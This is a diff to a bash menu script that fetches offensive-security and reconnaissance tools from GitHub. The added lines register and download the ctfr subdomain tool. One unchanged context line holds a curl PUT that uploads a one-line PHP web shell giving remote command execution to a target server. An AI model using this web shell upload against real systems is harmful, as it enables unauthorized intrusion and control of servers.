@@ -387,6 +387,7 @@ while true; do
 	echo -ne " 214. j3ssie/Osmedeus\t\t\t\t242. smicallef/spiderfoot\t\t\t\t308. yogeshojha/rengine\n"
 	echo -ne " 390. lanmaster53/recon-ng\t\t\t391. methos2016/recon-ng\t\t\t\t501. LukaSikic/subzy\n"
 	echo -ne " 556. LordNeoStark/tugarecon\t\t\t594. r3vn/badKarma\t\t\t\t\t599. utkusen/urlhunter\n"
+	echo -ne " 601. UnaPibaGeek/ctfr\n"
 	echo "$SEP"
 	echo "REVERSING"
 	echo -ne " 361. yeggor/UEFI_RETool\n"
@@ -3199,6 +3200,10 @@ while true; do
 				curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$URL""/""$SHL"".php"
 			fi
 		fi
+	;;
+	"601")
+		Scarica "$ENTRAW""UnaPibaGeek/ctfr/master/ctfr.py"
+		Scarica "$ENTRAW""UnaPibaGeek/ctfr/master/""$RQRM"
 	;;
 	*)
 		echo "error, invalid choice"
